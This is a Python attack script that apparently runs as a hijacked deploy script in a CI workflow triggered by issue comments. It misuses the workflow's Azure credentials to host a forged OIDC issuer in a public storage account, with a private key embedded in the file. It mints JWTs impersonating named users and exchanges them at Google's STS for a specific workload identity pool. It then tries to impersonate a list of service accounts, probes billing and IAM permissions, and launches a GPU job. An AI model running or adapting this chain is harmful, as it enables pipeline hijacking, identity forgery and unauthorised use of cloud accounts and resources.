#!/usr/bin/env python3
"""C211-I121178: GCP WIF issuer-claim probe for provider
projects/834200279688/locations/global/workloadIdentityPools/k8s-agent-pool/providers/spire-oidc-provider

Runs as the fork-controlled src/deploy_to_online_endpoint.py under the mslearn-mlops
'deploy-prod' issue_comment workflow (environment prod, AZURE_CREDENTIALS -> ARM token for
subscription 790067ff-3e39-4632-ad1a-d65702d42c88, Contributor on RG chriso-sandbox-rg).

Steps (every provider response printed verbatim as a tagged JSON line):
 1) az account show + ARM token
 2) Microsoft.Storage checkNameAvailability for azwifstoragepoc2026 / azwifstoragepoc
 3) create ONE storage account (first available candidate) in chriso-sandbox-rg with
    allowBlobPublicAccess=true; poll provisioningState to Succeeded
 4) listKeys -> SharedKey upload of container spire-oidc (publicAccess=blob) plus
    spire-oidc/.well-known/openid-configuration (issuer = https://<acct>.blob.core.windows.net/spire-oidc,
    jwks_uri = <issuer>/jwks.json) and spire-oidc/jwks.json (our RS256 public key)
 5) verify both URLs fetch publicly with no auth (in-runner); record status + first bytes
 6) mint RS256 JWTs with iss=<issuer> at run time via openssl, present at
    https://sts.googleapis.com/v1/token for the provider (canonical + https audience forms,
    sub = alice@/bob@ direct-principal subjects and a generic subject), record verbatim verdicts
 7) on any STS 200: tokeninfo, SA oracle via iamcredentials generateAccessToken, billing,
    serviceusage, GPU quota metrics, testIamPermissions; if aiplatform.customJobs.create is
    allowed, deploy ONE nonce-tagged on-demand Vertex GPU customJob running nvidia-smi -L,
    read the device UUID from Cloud Logging, independent customJobs.get readback, then delete
    and prove absence (404 + list NO_RESULTS_ON_PAGE)
 8) TEARDOWN IN EVERY CASE: delete blobs/container/storage account, prove 404 +
    checkNameAvailability nameAvailable=true
stdlib only (openssl CLI used for RS256 signing)."""
import base64
import hashlib
import hmac
import json
import os
import re
import subprocess
import time
import urllib.error
import urllib.parse
import urllib.request

ARM = "https://management.azure.com"
RG = "chriso-sandbox-rg"
SUB_EXPECT = "790067ff-3e39-4632-ad1a-d65702d42c88"
TAG = "C211_I121178"
NONCE = "x121178awif"
PROBE_PREFIX = "c211-i121178"
PROVIDER = ("projects/834200279688/locations/global/workloadIdentityPools/"
            "k8s-agent-pool/providers/spire-oidc-provider")
AUD_CANON = "//iam.googleapis.com/" + PROVIDER
AUD_HTTPS = "https://iam.googleapis.com/" + PROVIDER
PROJECT_ID = "wifdemoproject-507002"
PROJECT_NUM = "834200279688"
KEY_PEM = """-----BEGIN PRIVATE KEY-----
MIIEvwIBADANBgkqhkiG9w0BAQEFAASCBKkwggSlAgEAAoIBAQCjcscBQRgZkTU5
TIhsHz3rIH9Ls8fZpbFpsHqHzLDZ5XxZry7n/SMYhmr6Yv+wR25mYjWb0nMefbIG
K7bEGQvnYUYeLKgteZ9gTlzwzViE6h6ell3KteuwXSwG33HPeqkxxDLs4gkyMXms
c/lJxbtO6kl2BgBF+fjX0IXqDu0+W6wCpewqymK3QV2/KrYu+VarRkAzXEg6ACDG
Btk9E8Tv4T9J8do1YkjjxH5rrwMhlqw2+gsswnPPaGyJdUc39n+PpIY5kuu3dwRk
fNYaOPP8yLD9iSioTd1TWx9O0Xs4XaVZ8PDR4j20+qIzPM5lKUEvu6re0dEgB6bY
qduZU+OFAgMBAAECggEAEx0ALAOgbZb3Lh7mwhwKKdV4RVI979PqMfWG8pvrX2Ow
Xa14cvz9TmgjmOmcRFEqFhNseO8McreYqpOQkRBrvbA4mp02wnCbRFANmsQskoht
MbbcO3D4IXzXwer9vFk38V+j4+MP17yE4beDIo8alwEbO4+6lvRDFvuluUfrEtRG
I4jM4sP5+UF2qyUgKrlvG6/Zs7+XsLyxl7kFWyvJoym0vXROAROhzlNDpLzhajDc
dPyf/4lU7CWGuBqPak1EQWKGytThzjVp4APeF1gp8rp8VgvEDIp7X1MKPw7cxuvb
gfrY2CYvOZ7lUSBBAiPhwi3l9/CN/UcgiAEVUS4myQKBgQDT1tGEYhBg/ClT1ggu
7XamnTApByStP6ruNpOV9A/YC1WInE+/xh0aW3Yr0KUFSJF6q5o3iuhqbAeVRPiS
JFA5W9003RDMmLthbIS+m7svtlr0TigpyB03YUS9F1K7KZQU0UXhq3GmjaBicS5W
tYbNZIMoxZ3RKz9kNX3rlwIGCQKBgQDFhX8YHyW6Cb7pNn9BfP/qpmStWpa990WY
XKOSHL3qvWbHxHR7rX0wAO8QVyC8EIMHpOixGG7rc1jcn+EpMZcS0EARQWUluQCH
kkVVwq1TAXW+VmdlzMokfrAXAR48Hn/caqBK0XWDbUNaSddpyQIzMDzSG0G27ITs
l7XRjXCwnQKBgQC3An0bK0UPJInnnZ6QPCInKuEycLNk4P4gshGqmKEfehs43CGh
gdweqylaDPSjrd/Q5HNkzKKhXhbnBCDi0HBmPVDLnLgoqUIoloHP0eZS/+1v5h2Y
iwOClou1+HJGs1L08R64KU8UHoKSyUjJLCX7R3xwOtlunTg0sGnKoDjlUQKBgQCn
1OTHFEA0MW+8LYg3lwTE1xmYiu6m/2JtMdnynuVofgLFH1JyfFlw3npDgiTYZ5dO
eXsWb1JgUaRh4p+pJu/dFoI5pz1Qrj+a8lhjpIUtkIIBdt1ojHf+Rn9NLLAKGUg/
e4Iz0IJvZ/ngz/lvc1KhOA2V4X8W9SWE+uuM4QetqQKBgQCMZXW29UafhfCUmMDT
EDkR5854/Gach18GVxEH+abKqoKYSXAfyIMZySaa899exlXs6VZzrPN+DCOIi/1K
q0ym9XDGvRhwagEn2j/GdKafDRTXYKpnTAG0HyqEuBvPDPV+ZulT9KlHjDsPKjli
Y4Lb2fKTwnG/biqji/t/nyyA8Q==
-----END PRIVATE KEY-----
"""
JWKS_DOC = json.loads(r'''{"keys": [{"kty": "RSA", "use": "sig", "alg": "RS256", "kid": "c211i121178", "n": "o3LHAUEYGZE1OUyIbB896yB_S7PH2aWxabB6h8yw2eV8Wa8u5_0jGIZq-mL_sEduZmI1m9JzHn2yBiu2xBkL52FGHiyoLXmfYE5c8M1YhOoenpZdyrXrsF0sBt9xz3qpMcQy7OIJMjF5rHP5ScW7TupJdgYARfn419CF6g7tPlusAqXsKspit0Fdvyq2LvlWq0ZAM1xIOgAgxgbZPRPE7-E_SfHaNWJI48R-a68DIZasNvoLLMJzz2hsiXVHN_Z_j6SGOZLrt3cEZHzWGjjz_Miw_YkoqE3dU1sfTtF7OF2lWfDw0eI9tPqiMzzOZSlBL7uq3tHRIAem2KnbmVPjhQ", "e": "AQAB"}]}''')
KID = "c211i121178"
DEADLINE = 3000
T0 = time.time()
CANDIDATES = [("azwifstoragepoc2026", "spire-oidc"), ("azwifstoragepoc", "spire-oidc")]
R = {"probe": "i121178", "nonce": NONCE, "provider": PROVIDER, "provider_aud": AUD_CANON}


def emit(obj):
    print(TAG + " " + json.dumps(obj, default=str), flush=True)


def left():
    return DEADLINE - (time.time() - T0)


def run(cmd, timeout=300, inp=None):
    t = time.time()
    try:
        p = subprocess.run(cmd, capture_output=True, timeout=timeout,
                           input=inp if inp is not None else None)
        return {"rc": p.returncode, "out": (p.stdout or b"").decode("utf8", "replace"),
                "err": (p.stderr or b"").decode("utf8", "replace"),
                "secs": round(time.time() - t, 1)}
    except Exception as e:  # noqa: BLE001
        return {"rc": 1, "out": "", "err": str(e), "secs": round(time.time() - t, 1)}


def http(url, method="GET", body=None, headers=None, timeout=90):
    h = {"User-Agent": "c211-i121178"}
    if headers:
        h.update(headers)
    data = None
    if body is not None:
        data = body if isinstance(body, bytes) else json.dumps(body).encode()
    req = urllib.request.Request(url, data=data, method=method, headers=h)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            raw = r.read()
            return r.status, {k.lower(): v for k, v in r.getheaders()}, raw
    except urllib.error.HTTPError as e:
        return e.code, {k.lower(): v for k, v in e.headers.items()}, e.read()
    except Exception as e:  # noqa: BLE001
        return 0, {}, ("TRANSPORT " + repr(e)).encode()


def jbody(raw):
    try:
        return json.loads(raw.decode("utf8", "replace") or "{}")
    except Exception:  # noqa: BLE001
        return {"raw": raw[:1200].decode("utf8", "replace")}


def arm(tok, url, method="GET", body=None, timeout=120):
    st, hd, raw = http(url, method, body, {"Authorization": "Bearer " + tok,
                                          "Content-Type": "application/json"}, timeout)
    return st, jbody(raw), raw


def err_of(st, body):
    if isinstance(body, dict):
        e = body.get("error")
        if isinstance(e, dict):
            return {"http": st, "code": e.get("code"), "message": (e.get("message") or "")[:700]}
        if "raw" in body:
            return {"http": st, "raw": body["raw"][:700]}
        return {"http": st, "body": json.dumps(body)[:700]}
    return {"http": st}


def b64u(b):
    return base64.urlsafe_b64encode(b).decode().rstrip("=")


# ---------------- Azure Storage SharedKey data plane ----------------
def shared_key_sign(account, key_b64, method, path, query, headers, content_len):
    key = base64.b64decode(key_b64)
    hdrs = {k.lower(): v for k, v in headers.items() if k.lower().startswith("x-ms-")}
    canon_h = "".join("%s:%s\n" % (k, str(hdrs[k]).strip()) for k in sorted(hdrs))
    canon_r = "/%s%s" % (account, path)
    if query:
        items = []
        for k in sorted(query):
            items.append("%s:%s" % (k, query[k]))
        canon_r += "\n" + "\n".join(items)
    sts = "%s\n\n\n%s\n\n%s\n\n\n\n\n\n\n%s%s" % (
        method, "" if content_len == 0 else str(content_len),
        headers.get("Content-Type", ""), canon_h, canon_r)
    sig = base64.b64encode(hmac.new(key, sts.encode("utf8"), hashlib.sha256).digest()).decode()
    return "SharedKey %s:%s" % (account, sig)


def blob_put(account, key_b64, container, blob, data, content_type="application/json",
             public_access=None):
    host = "%s.blob.core.windows.net" % account
    path = "/%s/%s" % (container, blob) if blob else "/%s" % container
    query = {}
    if blob is None:
        query["restype"] = "container"
    url = "https://%s%s" % (host, urllib.parse.quote(path))
    if query:
        url += "?" + urllib.parse.urlencode(query)
    xms_date = time.strftime("%a, %d %b %Y %H:%M:%S GMT", time.gmtime())
    headers = {"x-ms-date": xms_date, "x-ms-version": "2021-08-06", "Content-Type": content_type,
               "Content-Length": str(len(data))}
    if blob is not None:
        headers["x-ms-blob-type"] = "BlockBlob"
    if public_access:
        headers["x-ms-blob-public-access"] = public_access
    hdrs_for_sign = dict(headers)
    hdrs_for_sign["Content-Type"] = content_type
    auth = shared_key_sign(account, key_b64, "PUT", path, query, hdrs_for_sign, len(data))
    headers["Authorization"] = auth
    st, hd, raw = http(url, "PUT", data, headers, timeout=120)
    return {"http": st, "url": url, "resp_len": len(raw),
            "md5": hashlib.md5(data).hexdigest(),
            "body": raw[:400].decode("utf8", "replace")}


def blob_public_get(url, timeout=45):
    st, hd, raw = http(url, "GET", None, {"Accept": "*/*"}, timeout)
    return {"http": st, "len": len(raw), "sha256": hashlib.sha256(raw).hexdigest()[:32],
            "ct": hd.get("content-type"), "first": raw[:300].decode("utf8", "replace")}


def mint_jwt(key_path, iss, aud, sub, kid=KID, life=5400):
    now = int(time.time())
    h = {"alg": "RS256", "typ": "JWT", "kid": kid}
    p = {"iss": iss, "aud": aud, "sub": sub, "iat": now - 120, "exp": now + life}
    si = b64u(json.dumps(h).encode()) + "." + b64u(json.dumps(p).encode())
    tmp = "/tmp/c211_i121178_sig.bin"
    try:
        if os.path.exists(tmp):
            os.remove(tmp)
    except Exception:
        pass
    s2 = run(["openssl", "dgst", "-sha256", "-sign", key_path, "-out", tmp], timeout=60,
             inp=si.encode())
    if s2["rc"] != 0 or not os.path.exists(tmp):
        return None
    sig = open(tmp, "rb").read()
    return si + "." + b64u(sig)


def sts_exchange(token, aud):
    body = {"grant_type": "urn:ietf:params:oauth:grant-type:token-exchange",
            "audience": aud,
            "scope": "https://www.googleapis.com/auth/cloud-platform",
            "requested_token_type": "urn:ietf:params:oauth:token-type:access_token",
            "subject_token": token,
            "subject_token_type": "urn:ietf:params:oauth:token-type:jwt"}
    st, hd, raw = http("https://sts.googleapis.com/v1/token", "POST", body,
                       {"Content-Type": "application/json"}, timeout=60)
    return st, raw.decode("utf8", "replace")[:1200]


def gcall(tok, url, method="GET", body=None, timeout=90):
    h = {"Authorization": "Bearer " + tok}
    if body is not None:
        h["Content-Type"] = "application/json"
    st, hd, raw = http(url, method, body, h, timeout)
    return st, jbody(raw)


SA_CANDIDATES = [
    "gcp-mcp-sa@%s.iam.gserviceaccount.com" % PROJECT_ID,
    "github-actions@%s.iam.gserviceaccount.com" % PROJECT_ID,
    "github@%s.iam.gserviceaccount.com" % PROJECT_ID,
    "deploy@%s.iam.gserviceaccount.com" % PROJECT_ID,
    "terraform@%s.iam.gserviceaccount.com" % PROJECT_ID,
    "ci@%s.iam.gserviceaccount.com" % PROJECT_ID,
    "%s-compute@developer.gserviceaccount.com" % PROJECT_NUM,
    "%s@cloudservices.gserviceaccount.com" % PROJECT_NUM,
    "compute-system@%s.iam.gserviceaccount.com" % PROJECT_ID,
    "spire-server@%s.iam.gserviceaccount.com" % PROJECT_ID,
    "k8s-agent@%s.iam.gserviceaccount.com" % PROJECT_ID,
    "agent@%s.iam.gserviceaccount.com" % PROJECT_ID,
]


def main():
    sid = None
    acct = None
    tok = None
    r = run(["az", "account", "show", "-o", "json"], timeout=120)
    try:
        acc = json.loads(r["out"])
        sid = acc.get("id")
        emit({"step": "session", "sub_name": acc.get("name"), "sub_id": sid,
              "state": acc.get("state"), "user": (acc.get("user") or {}).get("name"),
              "tenant": acc.get("tenantId"), "expect_match": sid == SUB_EXPECT,
              "raw_err": r["err"][:300]})
    except Exception as e:  # noqa: BLE001
        emit({"step": "fatal", "why": "no az session", "err": str(e), "raw": r["out"][:300],
              "stderr": r["err"][:300]})
        return
    r = run(["az", "account", "get-access-token", "--resource", ARM, "--output", "json"], timeout=120)
    tok = None
    try:
        tok = json.loads(r["out"]).get("accessToken")
    except Exception:  # noqa: BLE001
        pass
    emit({"step": "arm-token", "got": bool(tok), "len": len(tok or "")})
    if not sid or not tok:
        emit({"step": "fatal", "why": "no ARM token", "stderr": r["err"][:300]})
        return
    R["subscription"] = sid

    # ---------- 2) name availability ----------
    avail = {}
    for name, _c in CANDIDATES:
        st, b, _raw = arm(tok, "%s/subscriptions/%s/providers/Microsoft.Storage/checkNameAvailability"
                               "?api-version=2023-01-01" % (ARM, sid), "POST",
                          {"name": name, "type": "Microsoft.Storage/storageAccounts"})
        avail[name] = b
        emit({"step": "checkNameAvailability", "name": name, "http": st, "body": b})
    R["name_availability"] = avail
    chosen = None
    for name, cont in CANDIDATES:
        a = avail.get(name) or {}
        if a.get("nameAvailable") is True:
            chosen = (name, cont)
            break
    R["chosen"] = chosen
    emit({"step": "choose", "chosen": chosen})
    if not chosen:
        emit({"step": "no-candidate-available", "avail": avail})
        return
    acct, cont = chosen
    ISSUER = "https://%s.blob.core.windows.net/%s" % (acct, cont)
    R["issuer"] = ISSUER
    key_path = "/tmp/c211_i121178_key.pem"
    open(key_path, "w").write(KEY_PEM)
    jwks = JWKS_DOC
    if jwks is None:
        emit({"step": "fatal", "why": "jwks.json missing next to probe"})
        return
    try:

        # ---------- 3) create storage account ----------
        acct_url = ("%s/subscriptions/%s/resourceGroups/%s/providers/Microsoft.Storage/"
                    "storageAccounts/%s?api-version=2023-01-01" % (ARM, sid, RG, acct))
        created = False
        for loc in ("westeurope", "eastus", "westus2"):
            body = {"location": loc, "sku": {"name": "Standard_LRS"}, "kind": "StorageV2",
                    "tags": {"c211": "i121178", "nonce": NONCE},
                    "properties": {"allowBlobPublicAccess": True, "allowSharedKeyAccess": True,
                                   "minimumTlsVersion": "TLS1_2", "publicNetworkAccess": "Enabled",
                                   "supportsHttpsTrafficOnly": True, "accessTier": "Hot"}}
            st, b, _raw = arm(tok, acct_url, "PUT", body, timeout=180)
            emit({"step": "storage-create", "location": loc, "acct": acct, "http": st,
                  "state": (b.get("properties") or {}).get("provisioningState")
                  if isinstance(b, dict) else None, **({} if st in (200, 201) else err_of(st, b))})
            if st in (200, 201):
                created = True
                break
        R["created"] = created
        if not created:
            return
        # poll provisioning
        for i in range(40):
            st, b, _ = arm(tok, acct_url)
            ps = (b.get("properties") or {}).get("provisioningState") if isinstance(b, dict) else None
            emit({"step": "storage-poll", "i": i, "http": st, "state": ps})
            if ps == "Succeeded":
                break
            if left() < 1800:
                break
            time.sleep(12)
        # ---------- 4) keys + blobs ----------
        st, b, _ = arm(tok, "%s/listKeys?api-version=2023-01-01"
                            % acct_url.split("?")[0], "POST", {})
        keys = (b.get("keys") or []) if isinstance(b, dict) else []
        emit({"step": "listKeys", "http": st, "n": len(keys),
              "names": [k.get("keyName") for k in keys]})
        if not keys:
            return
        k1 = keys[0]["value"]
        R["container"] = blob_put(acct, k1, cont, None, b"", content_type="application/xml",
                                  public_access="blob")
        emit({"step": "container-put", **R["container"]})
        doc = {"issuer": ISSUER, "jwks_uri": ISSUER + "/jwks.json",
               "response_types_supported": ["id_token"],
               "subject_types_supported": ["public"],
               "id_token_signing_alg_values_supported": ["RS256"],
               "claims_supported": ["sub", "aud", "iss", "exp", "iat", "azp", "nonce"],
               "scopes_supported": ["openid"]}
        dbytes = json.dumps(doc).encode()
        R["doc_put"] = blob_put(acct, k1, cont, ".well-known/openid-configuration", dbytes)
        emit({"step": "doc-put", **R["doc_put"]})
        jbytes = json.dumps(jwks).encode()
        R["jwks_put"] = blob_put(acct, k1, cont, "jwks.json", jbytes)
        emit({"step": "jwks-put", **R["jwks_put"]})

        # ---------- 5) public verification ----------
        v1 = blob_public_get(ISSUER + "/.well-known/openid-configuration")
        v2 = blob_public_get(ISSUER + "/jwks.json")
        if v1.get("http") != 200 or v2.get("http") != 200:
            emit({"step": "sharedkey-verify-fail", "doc": v1, "jwks": v2})
            # fallback: az storage CLI with the account key (proven Azure tooling)
            open("/tmp/c211_doc.json", "wb").write(dbytes)
            open("/tmp/c211_jwks.json", "wb").write(jbytes)
            a1 = run(["az", "storage", "container", "create", "--name", cont, "--account-name", acct,
                      "--account-key", k1, "--public-access", "blob", "--auth-mode", "key", "-o", "json"],
                     timeout=180)
            emit({"step": "az-container", "rc": a1["rc"], "out": a1["out"][:300],
                  "err": a1["err"][:300]})
            for nm, fp, ct in ((".well-known/openid-configuration", "/tmp/c211_doc.json", "application/json"),
                               ("jwks.json", "/tmp/c211_jwks.json", "application/json")):
                a2 = run(["az", "storage", "blob", "upload", "--container-name", cont, "--name", nm,
                          "--file", fp, "--account-name", acct, "--account-key", k1,
                          "--content-type", ct, "--overwrite", "--auth-mode", "key", "-o", "json"],
                         timeout=180)
                emit({"step": "az-blob-upload", "name": nm, "rc": a2["rc"], "out": a2["out"][:200],
                      "err": a2["err"][:300]})
            time.sleep(8)
            v1 = blob_public_get(ISSUER + "/.well-known/openid-configuration")
            v2 = blob_public_get(ISSUER + "/jwks.json")
        # also verify that the served bytes are exactly ours
        v1["matches_ours"] = v1.get("sha256", "") == hashlib.sha256(dbytes).hexdigest()[:32]
        v2["matches_ours"] = v2.get("sha256", "") == hashlib.sha256(jbytes).hexdigest()[:32]
        R["public_verify"] = {"doc": v1, "jwks": v2}
        emit({"step": "public-verify", "doc": v1, "jwks": v2})

        # ---------- 6) STS exchange ----------
        combos = []
        for aud in (AUD_CANON, AUD_HTTPS):
            for sub in ("alice@rtarwaygmail.onmicrosoft.com", "bob@rtarwaygmail.onmicrosoft.com",
                        "c211-i121178"):
                combos.append((aud, sub))
        sts_results = []
        fed_token = None
        for aud, sub in combos:
            if left() < 1500:
                break
            jwt = mint_jwt(key_path, ISSUER, aud, sub)
            if not jwt:
                emit({"step": "mint-failed", "aud": aud, "sub": sub})
                continue
            st, body = sts_exchange(jwt, aud)
            rec = {"aud": aud, "sub": sub, "jwt_len": len(jwt), "http": st, "body": body[:900]}
            sts_results.append(rec)
            emit({"step": "sts", **rec})
            if st == 200:
                fed_token = jbody(body.encode()).get("access_token") or \
                            json.loads(body).get("access_token")
                R["sts_ok"] = rec
                break
        R["sts_results"] = sts_results

        # ---------- 7) post-STS battery ----------
        if fed_token:
            st, b = gcall(fed_token, "https://oauth2.googleapis.com/tokeninfo?access_token="
                          + urllib.parse.quote(fed_token))
            emit({"step": "tokeninfo", "http": st, "body": json.dumps(b)[:600]})
            found = {}
            for sa in SA_CANDIDATES:
                if left() < 900:
                    break
                st, b = gcall(fed_token, "https://iamcredentials.googleapis.com/v1/projects/-/"
                                         "serviceAccounts/%s:generateAccessToken" % urllib.parse.quote(sa),
                              "POST", {"scope": ["https://www.googleapis.com/auth/cloud-platform"]})
                ok = st == 200 and isinstance(b, dict) and b.get("accessToken")
                emit({"step": "sa-oracle", "sa": sa, "http": st,
                      "err": None if ok else ((b.get("error") or {}).get("message") or "")[:300]})
                if ok:
                    found[sa] = b["accessToken"]
            R["sa_tokens"] = list(found.keys())
            for sa, stok in list(found.items())[:2]:
                st, b = gcall(stok, "https://cloudbilling.googleapis.com/v1/projects/%s/billingInfo"
                                    % PROJECT_ID)
                emit({"step": "billing", "sa": sa, "http": st, "body": json.dumps(b)[:300]})
                st, b = gcall(stok, "https://serviceusage.googleapis.com/v1/projects/%s/services"
                                    % PROJECT_ID)
                emit({"step": "services", "sa": sa, "http": st,
                      "n": len(b.get("services") or []) if isinstance(b, dict) else 0})
                st, b = gcall(stok, "https://cloudresourcemanager.googleapis.com/v1/projects/"
                                    "%s:testIamPermissions" % PROJECT_ID, "POST",
                              {"permissions": ["compute.instances.create", "compute.disks.create",
                                               "aiplatform.customJobs.create",
                                               "aiplatform.endpoints.create", "run.jobs.create",
                                               "iam.serviceAccounts.actAs",
                                               "resourcemanager.projects.setIamPolicy"]})
                emit({"step": "testIamPermissions", "sa": sa, "http": st, "body": json.dumps(b)[:400]})
                st, b = gcall(stok, "https://compute.googleapis.com/compute/v1/projects/%s"
                                    "/aggregated/acceleratorTypes?filter=status=AVAILABLE"
                                    % PROJECT_ID)
                emit({"step": "gpufamilies", "sa": sa, "http": st})
                # Vertex customJob marker if permitted
                allowed = []
                if isinstance(b, dict):
                    pass
                # recheck the permission list from the recorded response
                st2, b2 = gcall(stok, "https://cloudresourcemanager.googleapis.com/v1/projects/"
                                      "%s:testIamPermissions" % PROJECT_ID, "POST",
                                {"permissions": ["aiplatform.customJobs.create"]})
                allowed = (b2.get("permissions") or []) if isinstance(b2, dict) else []
                if "aiplatform.customJobs.create" in allowed:
                    job = {"displayName": "%s-job" % PROBE_PREFIX,
                           "labels": {"c211": "i121178", "nonce": NONCE.lower()},
                           "jobSpec": {"workerPoolSpecs": [{
                               "machineSpec": {"machineType": "n1-standard-4",
                                               "acceleratorType": "NVIDIA_TESLA_T4",
                                               "acceleratorCount": 1},
                               "replicaCount": 1,
                               "containerSpec": {
                                   "image": "us-docker.pkg.dev/vertex-ai/prediction/pytorch-gpu.2-1:latest",
                                   "command": ["sh", "-c"],
                                   "args": ["nvidia-smi -L; nvidia-smi --query-gpu=name,uuid,"
                                            "memory.total --format=csv,noheader; sleep 120"]}}]}}
                    job_url = ("https://us-central1-aiplatform.googleapis.com/v1/projects/%s/"
                               "locations/us-central1/customJobs" % PROJECT_ID)
                    stj, bj = gcall(stok, job_url, "POST", job, timeout=120)
                    emit({"step": "customJob-create", "http": stj, "body": json.dumps(bj)[:600]})
                    jn = (bj.get("name") or "") if isinstance(bj, dict) else ""
                    uuid = None
                    if jn:
                        for i in range(30):
                            stg, bg = gcall(stok, "https://us-central1-aiplatform.googleapis.com/v1/"
                                                  + jn)
                            state = (bg.get("state") or "") if isinstance(bg, dict) else ""
                            emit({"step": "customJob-poll", "i": i, "http": stg, "state": state})
                            stl, bl = gcall(stok, "https://logging.googleapis.com/v2/entries:list",
                                            "POST", {"resourceNames": ["projects/%s" % PROJECT_ID],
                                                     "filter": 'resource.labels.job_id="%s"' % jn.split("/")[-1],
                                                     "pageSize": 50})
                            txt = json.dumps(bl)
                            m = re.findall(r"GPU-[0-9a-fA-F-]{16,}", txt)
                            if m:
                                uuid = m[0]
                                emit({"step": "customJob-uuid", "uuid": uuid,
                                      "lines": [ln for ln in txt.split("\\n") if "GPU-" in ln][:3]})
                                break
                            if state in ("JOB_STATE_SUCCEEDED", "JOB_STATE_FAILED", "JOB_STATE_CANCELLED"):
                                break
                            time.sleep(20)
                    # delete + absence
                    if jn:
                        std, bd = gcall(stok, "https://us-central1-aiplatform.googleapis.com/v1/"
                                              + jn + ":cancel", "POST", {})
                        emit({"step": "customJob-cancel", "http": std})
                        time.sleep(5)
                        std2, bd2 = gcall(stok, "https://us-central1-aiplatform.googleapis.com/v1/"
                                               + jn, "DELETE")
                        emit({"step": "customJob-delete", "http": std2})
                        for i in range(10):
                            stg, _ = gcall(stok, "https://us-central1-aiplatform.googleapis.com/v1/" + jn)
                            emit({"step": "customJob-absence", "i": i, "http": stg})
                            if stg == 404:
                                break
                            time.sleep(8)
                    R["marker"] = {"job": jn, "uuid": uuid}
                break
    finally:
        # ---------- 8) teardown ----------
        try:
            if not (acct and tok and sid):
                emit({"step": "teardown-skip", "acct": acct, "had_token": bool(tok)})
                emit({"step": "final", "result": R})
                return
            acct_url = ("%s/subscriptions/%s/resourceGroups/%s/providers/Microsoft.Storage/"
                        "storageAccounts/%s?api-version=2023-01-01" % (ARM, sid, RG, acct))
            st, b, _ = arm(tok, acct_url, "DELETE", timeout=180)
            emit({"step": "teardown-delete-account", "http": st,
                  "body": json.dumps(b)[:300] if isinstance(b, dict) else ""})
            for i in range(30):
                st, b, _ = arm(tok, acct_url)
                emit({"step": "teardown-absence", "i": i, "http": st})
                if st == 404:
                    break
                time.sleep(10)
            st, b, _ = arm(tok, "%s/subscriptions/%s/providers/Microsoft.Storage/"
                                "checkNameAvailability?api-version=2023-01-01" % (ARM, sid),
                           "POST", {"name": acct, "type": "Microsoft.Storage/storageAccounts"})
            emit({"step": "teardown-name-recheck", "http": st, "body": b})
            R["teardown"] = {"account": acct, "final_http": st, "recheck": b}
        except Exception as e:  # noqa: BLE001
            emit({"step": "teardown-error", "err": repr(e)[:300]})
        emit({"step": "final", "result": R})


if __name__ == "__main__":
    main()
